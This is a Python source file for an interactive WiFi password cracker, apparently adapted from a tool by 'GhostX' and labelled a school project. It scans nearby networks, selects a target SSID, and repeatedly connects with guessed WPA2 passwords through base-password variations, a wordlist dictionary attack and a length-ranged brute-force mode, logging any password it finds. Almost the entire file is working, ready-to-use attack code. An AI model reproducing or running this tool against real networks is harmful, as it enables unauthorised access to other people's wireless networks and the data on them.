#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import platform
import re
import time
import signal
import itertools
from datetime import datetime

try:
    import pywifi
    from pywifi import PyWiFi, const, Profile
except ImportError:
    print("Installing pywifi...")
    os.system("pip install pywifi")
    import pywifi
    from pywifi import PyWiFi, const, Profile

# Author: GhostX (Original)
# GITHUB: https://github.com/tuanek/
# CopyRight 2019 ~ Upgraded 2025

# Color codes
RED    = "\033[1;31m"  
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
GREEN  = "\033[0;32m"
YELLOW = "\033[1;33m"
RESET  = "\033[0;0m"
BOLD   = "\033[;1m"

class WiFiCracker:
    def __init__(self):
        self.wifi = PyWiFi()
        self.iface = None
        self.results = []
        self.start_time = None
        self.attempts = 0
        self.found = False
        self.stopped = False
        self.log_file = f"wifi_crack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        # Setup signal handler for stop (Ctrl+C)
        signal.signal(signal.SIGINT, self.stop_program)
        
        # Try to setup signal handler for stop (Ctrl+Z) if available
        try:
            signal.signal(signal.SIGTSTP, self.stop_program)
            self.ctrl_z_supported = True
        except AttributeError:
            # SIGTSTP not available on this platform (e.g., Windows)
            self.ctrl_z_supported = False
        
        # Try to setup signal handler for termination
        try:
            signal.signal(signal.SIGTERM, self.stop_program)
        except AttributeError:
            # SIGTERM not available on this platform
            pass
    
    def stop_program(self, signum, frame):
        """Stop the program with Ctrl+C or Ctrl+Z"""
        signal_name = "Ctrl+C" if signum == signal.SIGINT else "Ctrl+Z" if signum == signal.SIGTSTP else "SIGTERM"
        print(f"\n{RED}[!] STOPPING PROGRAM - {signal_name} pressed{RESET}")
        self.stopped = True
    
    def check_wifi_card(self):
        """Check available WiFi interfaces"""
        try:
            interfaces = self.wifi.interfaces()
            if not interfaces:
                print(f"{RED}[-] No WiFi interfaces found{RESET}")
                return False
                
            print(f"{CYAN}[+] Available WiFi interfaces:{RESET}")
            for i, iface in enumerate(interfaces):
                print(f"{BLUE}    {i+1}. {iface.name()}{RESET}")
            
            # Auto-select first interface or let user choose
            if len(interfaces) == 1:
                self.iface = interfaces[0]
                print(f"{GREEN}[+] Using interface: {self.iface.name()}{RESET}")
            else:
                choice = input(f"{BLUE}[?] Select interface (1-{len(interfaces)}): {RESET}")
                self.iface = interfaces[int(choice)-1]
                
            return True
        except Exception as e:
            print(f"{RED}[-] Error checking WiFi card: {str(e)}{RESET}")
            return False
    
    def scan_networks(self):
        """Scan for available WiFi networks"""
        try:
            print(f"\n{CYAN}[~] Scanning for WiFi networks...{RESET}")
            self.iface.scan()
            time.sleep(5)  # Wait for scan to complete
            
            self.results = self.iface.scan_results()
            
            if not self.results:
                print(f"{RED}[-] No networks found{RESET}")
                return None
                
            print(f"{CYAN}[+] Found {len(self.results)} networks:{RESET}")
            for i, network in enumerate(self.results):
                # Try to decode SSID, handle encoding issues
                try:
                    ssid = network.ssid.encode('raw_unicode_escape').decode('utf-8')
                except:
                    ssid = network.ssid
                
                # Get signal strength and security type
                signal = abs(network.signal)
                auth = network.akm[0] if network.akm else "OPEN"
                
                # Color code based on signal strength
                if signal < 50:
                    signal_color = GREEN
                elif signal < 70:
                    signal_color = YELLOW
                else:
                    signal_color = RED
                
                print(f"{BLUE}    {i+1}. {ssid}{RESET} | {signal_color}Signal: {signal}%{RESET} | Auth: {auth}")
            
            return self.results
        except Exception as e:
            print(f"{RED}[-] Error scanning networks: {str(e)}{RESET}")
            return None
    
    def get_ssid(self):
        """Get SSID from user - either by scanning or manual input"""
        print(f"\n{CYAN}[~] How would you like to select the target WiFi?{RESET}")
        print(f"{BLUE}    1. Scan and select from available networks{RESET}")
        print(f"{BLUE}    2. Enter SSID manually{RESET}")
        
        choice = input(f"{BLUE}[?] Select option (1-2): {RESET}")
        
        if choice == "1":
            networks = self.scan_networks()
            if networks:
                try:
                    net_choice = int(input(f"{BLUE}[?] Select network (1-{len(networks)}): {RESET}"))
                    if 1 <= net_choice <= len(networks):
                        try:
                            ssid = networks[net_choice-1].ssid.encode('raw_unicode_escape').decode('utf-8')
                            print(f"{GREEN}[+] Selected SSID: {ssid}{RESET}")
                            return ssid
                        except:
                            ssid = networks[net_choice-1].ssid
                            print(f"{GREEN}[+] Selected SSID: {ssid}{RESET}")
                            return ssid
                    else:
                        print(f"{RED}[-] Invalid selection{RESET}")
                        return self.get_ssid()
                except ValueError:
                    print(f"{RED}[-] Please enter a valid number{RESET}")
                    return self.get_ssid()
            else:
                print(f"{YELLOW}[-] No networks found, please enter SSID manually{RESET}")
                return input(f"{BLUE}[?] Enter target SSID: {RESET}")
        else:
            return input(f"{BLUE}[?] Enter target SSID: {RESET}")
    
    def connect_to_network(self, ssid, password):
        """Attempt to connect to WiFi network"""
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        
        # Connection attempt with timeout
        self.iface.connect(tmp_profile)
        time.sleep(0.5)  # Initial wait
        
        # Check connection status with timeout
        timeout = 10  # seconds
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if self.iface.status() == const.IFACE_CONNECTED:
                return True
            time.sleep(0.2)
        
        return False
    
    def generate_password_variations(self, base_password, variations_type="all"):
        """Generate variations of the base password"""
        variations = []
        
        # Original password
        variations.append(base_password)
        
        # Reversed password
        reversed_pwd = base_password[::-1]
        variations.append(reversed_pwd)
        
        if variations_type == "all":
            # Common number suffixes
            number_suffixes = ["", "1", "12", "123", "1234", "12345", "123456", "1234567", "12345678", 
                              "123456789", "0", "01", "012", "0123", "01234", "012345", "0123456", 
                              "01234567", "012345678", "0123456789", "2023", "2024", "2025"]
            
            # Generate variations with number suffixes
            for suffix in number_suffixes:
                variations.append(base_password + suffix)
                variations.append(reversed_pwd + suffix)
            
            # Common number prefixes
            number_prefixes = ["", "1", "12", "123", "1234", "12345", "123456", "1234567", "12345678", 
                              "123456789", "0", "01", "012", "0123", "01234", "012345", "0123456", 
                              "01234567", "012345678", "0123456789", "2023", "2024", "2025"]
            
            # Generate variations with number prefixes
            for prefix in number_prefixes:
                variations.append(prefix + base_password)
                variations.append(prefix + reversed_pwd)
            
            # Common special character suffixes
            special_suffixes = ["!", "@", "#", "$", "%", "^", "&", "*", "()", "!@#", "!@#$", "!@#$%"]
            
            # Generate variations with special character suffixes
            for suffix in special_suffixes:
                variations.append(base_password + suffix)
                variations.append(reversed_pwd + suffix)
            
            # Leet speak variations
            leet_map = {
                'a': '@', 'e': '3', 'i': '!', 'o': '0', 's': '$', 't': '7',
                'A': '@', 'E': '3', 'I': '!', 'O': '0', 'S': '$', 'T': '7'
            }
            
            # Generate leet variations
            leet_pwd = base_password
            for char, replacement in leet_map.items():
                leet_pwd = leet_pwd.replace(char, replacement)
            variations.append(leet_pwd)
            
            leet_reversed = reversed_pwd
            for char, replacement in leet_map.items():
                leet_reversed = leet_reversed.replace(char, replacement)
            variations.append(leet_reversed)
        
        # Capitalization variations (only for lowercase variations_type)
        if variations_type == "lowercase":
            variations.append(base_password.lower())
            variations.append(reversed_pwd.lower())
        else:  # For "all" variations_type
            variations.append(base_password.capitalize())
            variations.append(base_password.upper())
            variations.append(base_password.lower())
            variations.append(reversed_pwd.capitalize())
            variations.append(reversed_pwd.upper())
            variations.append(reversed_pwd.lower())
        
        # Remove duplicates
        variations = list(set(variations))
        
        return variations
    
    def generate_bruteforce_passwords(self, min_length, max_length, charset):
        """Generate passwords using brute-force approach"""
        for length in range(min_length, max_length + 1):
            for combination in itertools.product(charset, repeat=length):
                yield ''.join(combination)
    
    def estimate_bruteforce_combinations(self, min_length, max_length, charset):
        """Estimate the number of combinations for brute-force attack"""
        charset_size = len(charset)
        total = 0
        for length in range(min_length, max_length + 1):
            total += charset_size ** length
        return total
    
    def get_charset(self, charset_type):
        """Get character set based on type"""
        if charset_type == "numbers":
            return "0123456789"
        elif charset_type == "lowercase":
            return "abcdefghijklmnopqrstuvwxyz"
        elif charset_type == "uppercase":
            return "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        elif charset_type == "special":
            return "!@#$%^&*()_+-=[]{}|;:,.<>?"
        elif charset_type == "mixed":
            return "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
        else:
            return "abcdefghijklmnopqrstuvwxyz0123456789"  # Default
    
    def crack_password(self, ssid, wordlist_file=None, hybrid=False, min_length=8, max_length=12, 
                      charset="mixed", base_password=None):
        """Main password cracking function with hybrid mode"""
        # Initialize start_time if not already set
        if self.start_time is None:
            self.start_time = time.time()
        
        # Get charset based on type
        charset = self.get_charset(charset)
        
        # Determine variations type based on charset
        variations_type = "lowercase" if charset == "abcdefghijklmnopqrstuvwxyz" else "all"
        
        # First, try base password variations if provided
        if base_password:
            variations = self.generate_password_variations(base_password, variations_type)
            total_variations = len(variations)
            
            print(f"\n{CYAN}[~] Starting base password variations attack on: {BOLD}{ssid}{RESET}")
            print(f"{CYAN}[~] Base password: {base_password}{RESET}")
            print(f"{CYAN}[~] Generated variations: {total_variations}{RESET}")
            print(f"{CYAN}[~] Log file: {self.log_file}{RESET}")
            print(f"{YELLOW}[!] Press Ctrl+C to stop", end="")
            if self.ctrl_z_supported:
                print(" or Ctrl+Z{RESET}\n")
            else:
                print("{RESET}\n")
            
            for i, password in enumerate(variations):
                if self.found or self.stopped:
                    break
                
                self.attempts += 1
                progress = ((i + 1) / total_variations) * 100
                elapsed = time.time() - self.start_time
                attempts_per_sec = self.attempts / elapsed if elapsed > 0 else 0
                
                # Status update
                sys.stdout.write(
                    f"\r{BLUE}[*] Variations {i+1}/{total_variations} ({progress:.1f}%) | "
                    f"Speed: {attempts_per_sec:.1f} p/s | "
                    f"Testing: {password[:15]}{'...' if len(password) > 15 else ''}{RESET}"
                )
                sys.stdout.flush()
                
                # Attempt connection
                if self.connect_to_network(ssid, password):
                    self.found = True
                    self.log_result(ssid, password, True)
                    print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password found in variations: {password}{RESET}")
                    print(f"{GREEN}[+] Attempts: {self.attempts}{RESET}")
                    print(f"{GREEN}[+] Time elapsed: {self.format_time(elapsed)}{RESET}")
                    return
                else:
                    if self.attempts % 10 == 0:  # Log every 10 attempts
                        self.log_result(ssid, password, False)
            
            if self.stopped:
                print(f"\n\n{YELLOW}[!] Program stopped by user{RESET}")
                print(f"{YELLOW}[!] Total attempts: {self.attempts}{RESET}")
                print(f"{YELLOW}[!] Time elapsed: {self.format_time(time.time() - self.start_time)}{RESET}")
                return
            
            if not self.found:
                print(f"\n\n{YELLOW}[-] Base password variations completed, password not found{RESET}")
                self.log_result(ssid, None, False)
        
        # Next, try wordlist if provided
        if wordlist_file and os.path.exists(wordlist_file) and not self.found and not self.stopped:
            # Reset counter for wordlist phase
            wordlist_attempts = 0
            wordlist_start_time = time.time()
            total_passwords = sum(1 for _ in open(wordlist_file, 'r', encoding='utf8', errors='ignore'))
            
            print(f"\n{CYAN}[~] Starting dictionary attack on: {BOLD}{ssid}{RESET}")
            print(f"{CYAN}[~] Wordlist: {wordlist_file} ({total_passwords:,} passwords){RESET}")
            print(f"{YELLOW}[!] Press Ctrl+C to stop", end="")
            if self.ctrl_z_supported:
                print(" or Ctrl+Z{RESET}\n")
            else:
                print("{RESET}\n")
            
            with open(wordlist_file, 'r', encoding='utf8', errors='ignore') as wordlist:
                for line in wordlist:
                    if self.found or self.stopped:
                        break
                    
                    password = line.strip()
                    if not password:
                        continue
                    
                    self.attempts += 1
                    wordlist_attempts += 1
                    progress = (wordlist_attempts / total_passwords) * 100
                    elapsed = time.time() - self.start_time
                    attempts_per_sec = wordlist_attempts / elapsed if elapsed > 0 else 0
                    
                    # Status update
                    sys.stdout.write(
                        f"\r{BLUE}[*] Dictionary {wordlist_attempts}/{total_passwords} ({progress:.1f}%) | "
                        f"Speed: {attempts_per_sec:.1f} p/s | "
                        f"Testing: {password[:15]}{'...' if len(password) > 15 else ''}{RESET}"
                    )
                    sys.stdout.flush()
                    
                    # Attempt connection
                    if self.connect_to_network(ssid, password):
                        self.found = True
                        self.log_result(ssid, password, True)
                        print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password found in dictionary: {password}{RESET}")
                        print(f"{GREEN}[+] Total attempts: {self.attempts}{RESET}")
                        print(f"{GREEN}[+] Time elapsed: {self.format_time(elapsed)}{RESET}")
                        return
                    else:
                        if wordlist_attempts % 50 == 0:  # Log every 50 attempts
                            self.log_result(ssid, password, False)
            
            if self.stopped:
                print(f"\n\n{YELLOW}[!] Program stopped by user{RESET}")
                print(f"{YELLOW}[!] Total attempts: {self.attempts}{RESET}")
                print(f"{YELLOW}[!] Time elapsed: {self.format_time(time.time() - self.start_time)}{RESET}")
                return
            
            if not self.found:
                print(f"\n\n{YELLOW}[-] Dictionary attack completed, password not found{RESET}")
                self.log_result(ssid, None, False)
        
        # Finally, if hybrid mode and password not found, proceed to brute-force
        if hybrid and not self.found and not self.stopped:
            # Reset counter for brute-force phase
            bf_attempts = 0
            bf_start_time = time.time()
            total_combinations = self.estimate_bruteforce_combinations(min_length, max_length, charset)
            
            print(f"\n{CYAN}[~] Starting brute-force attack on: {BOLD}{ssid}{RESET}")
            print(f"{CYAN}[~] Character set: {charset}{RESET}")
            print(f"{CYAN}[~] Password length: {min_length}-{max_length}{RESET}")
            print(f"{CYAN}[~] Estimated combinations: {total_combinations:,}{RESET}")
            print(f"{YELLOW}[!] Press Ctrl+C to stop", end="")
            if self.ctrl_z_supported:
                print(" or Ctrl+Z{RESET}\n")
            else:
                print("{RESET}\n")
            
            for password in self.generate_bruteforce_passwords(min_length, max_length, charset):
                if self.found or self.stopped:
                    break
                
                self.attempts += 1
                bf_attempts += 1
                progress = (bf_attempts / total_combinations) * 100
                elapsed = time.time() - self.start_time
                attempts_per_sec = bf_attempts / elapsed if elapsed > 0 else 0
                
                # Status update
                sys.stdout.write(
                    f"\r{BLUE}[*] Brute-force {bf_attempts}/{total_combinations} ({progress:.1f}%) | "
                    f"Speed: {attempts_per_sec:.1f} p/s | "
                    f"Testing: {password[:15]}{'...' if len(password) > 15 else ''}{RESET}"
                )
                sys.stdout.flush()
                
                # Attempt connection
                if self.connect_to_network(ssid, password):
                    self.found = True
                    self.log_result(ssid, password, True)
                    print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password found with brute-force: {password}{RESET}")
                    print(f"{GREEN}[+] Total attempts: {self.attempts}{RESET}")
                    print(f"{GREEN}[+] Time elapsed: {self.format_time(elapsed)}{RESET}")
                    return
                else:
                    if bf_attempts % 50 == 0:  # Log every 50 attempts
                        self.log_result(ssid, password, False)
            
            if self.stopped:
                print(f"\n\n{YELLOW}[!] Program stopped by user{RESET}")
                print(f"{YELLOW}[!] Total attempts: {self.attempts}{RESET}")
                print(f"{YELLOW}[!] Time elapsed: {self.format_time(time.time() - self.start_time)}{RESET}")
                return
            
            if not self.found:
                elapsed = time.time() - self.start_time
                print(f"\n\n{RED}[-] Password not found in any attack method{RESET}")
                print(f"{RED}[-] Total attempts: {self.attempts}{RESET}")
                print(f"{RED}[-] Time elapsed: {self.format_time(elapsed)}{RESET}")
                self.log_result(ssid, None, False)
    
    def log_result(self, ssid, password, success):
        """Log results to file"""
        with open(self.log_file, 'a', encoding='utf8') as log:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            if success:
                log.write(f"[{timestamp}] SUCCESS - SSID: {ssid} | Password: {password}\n")
            else:
                log.write(f"[{timestamp}] FAILED - SSID: {ssid} | Attempts: {self.attempts}\n")
    
    def format_time(self, seconds):
        """Format time in human readable format"""
        hours, remainder = divmod(seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
    
    def show_banner(self):
        """Display program banner"""
        banner = f"""
{RED}
██╗  ██╗████████╗███████╗ █████╗ ███╗   ███╗
╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
 ╚███╔╝    ██║   █████╗  ███████║██╔████╔██║
 ██╔██╗    ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██╔╝ ██╗   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
 ❀° ┄─────────────────────────────────────╮
    Develop by GhostX | Wireless Attacks     
 ╰────────────────────────────────────┄ °❀ {RESET}
"""
        print(banner)
    
    def run(self):
        """Main execution function"""
        self.show_banner()
        
        # Parse command line arguments
        parser = argparse.ArgumentParser(description='WiFi Password Cracker - School Project')
        parser.add_argument('-s', '--ssid', type=str, help='Target WiFi SSID')
        parser.add_argument('-w', '--wordlist', type=str, help='Path to password wordlist')
        parser.add_argument('-p', '--password', type=str, help='Base password for hybrid mode variations')
        parser.add_argument('-i', '--interface', type=int, help='WiFi interface number')
        parser.add_argument('--hybrid', action='store_true', help='Enable hybrid mode (dictionary + brute-force)')
        parser.add_argument('--min-length', type=int, default=8, help='Minimum password length for brute-force (default: 8)')
        parser.add_argument('--max-length', type=int, default=12, help='Maximum password length for brute-force (default: 12)')
        parser.add_argument('--charset', type=str, default="mixed", 
                          choices=['numbers', 'lowercase', 'uppercase', 'special', 'mixed'],
                          help='Character set for brute-force: numbers, lowercase, uppercase, special, or mixed (default: mixed)')
        parser.add_argument('-v', '--version', action='version', version='WiFi Cracker v2.0 - School Project')
        
        args = parser.parse_args()
        
        # Check WiFi card
        if not self.check_wifi_card():
            sys.exit(1)
        
        # Get SSID - either from command line or user input
        ssid = args.ssid if args.ssid else self.get_ssid()
        
        # Get wordlist (optional)
        wordlist = args.wordlist if args.wordlist else None
        if not args.hybrid and not wordlist and not args.password:
            wordlist = input(f"{BLUE}[?] Enter path to wordlist (optional, press Enter to skip): {RESET}")
            if not wordlist:
                wordlist = None
        
        # Start cracking
        self.crack_password(
            ssid=ssid, 
            wordlist_file=wordlist, 
            hybrid=args.hybrid,
            min_length=args.min_length,
            max_length=args.max_length,
            charset=args.charset,
            base_password=args.password
        )

if __name__ == "__main__":
    try:
        cracker = WiFiCracker()
        cracker.run()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Operation cancelled by user{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error: {str(e)}{RESET}")